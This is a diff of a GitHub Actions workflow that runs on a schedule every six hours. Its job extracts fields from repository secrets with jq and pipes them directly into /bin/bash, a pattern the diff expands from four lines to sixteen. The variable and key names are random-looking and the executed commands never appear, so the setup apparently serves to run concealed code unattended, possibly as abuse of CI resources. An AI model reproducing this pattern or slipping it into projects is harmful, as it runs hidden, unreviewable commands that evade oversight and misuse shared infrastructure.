@@ -1,20 +1,32 @@
 name: zengfeixiang6719
-
 on:
   workflow_dispatch:
   schedule:
-    - cron: '45 4/6 * * *'
-jobs:  # 31239
+    - cron: '59 5/6 * * *'
+jobs:
   build:
     runs-on: ubuntu-latest
+
     steps:
       - uses: actions/checkout@v4
       - name: zengfeixiang6719
         env:
-          eidfy86: ${{ secrets.eidfy86 }}
+          mxk5: ${{ secrets.mxk5 }}
         run: |
-          echo $eidfy86 | jq -r .vtosp5 | /bin/bash
-          echo $layo57 | jq -r .oymje27 | /bin/bash
-          echo $f63505 | jq -r .k0880 | /bin/bash
-          echo $ure89 | jq -r .xx7368 | /bin/bash
+          echo $mxk5 | jq -r .a408 | /bin/bash
+          echo $jpsrq6 | jq -r .dfdb0433 | /bin/bash
+          echo $v00473 | jq -r .jilk5353 | /bin/bash
+          echo $q6587 | jq -r .k3 | /bin/bash
+          echo $mlz05 | jq -r .j1848 | /bin/bash
+          echo $yean090 | jq -r .guckx849 | /bin/bash
+          echo $kzki45 | jq -r .c6 | /bin/bash
+          echo $j7 | jq -r .whwpy73 | /bin/bash
+          echo $pjpvt737 | jq -r .rdq515 | /bin/bash
+          echo $oknu8 | jq -r .ypnza4495 | /bin/bash
+          echo $egsp9 | jq -r .m1455 | /bin/bash
+          echo $psj87 | jq -r .xsu00 | /bin/bash
+          echo $b002 | jq -r .cwmb3565 | /bin/bash
+          echo $zelkr1281 | jq -r .zgj42751 | /bin/bash
+          echo $ebpam57 | jq -r .tw51 | /bin/bash
+          echo $yq5302 | jq -r .b831 | /bin/bash
 
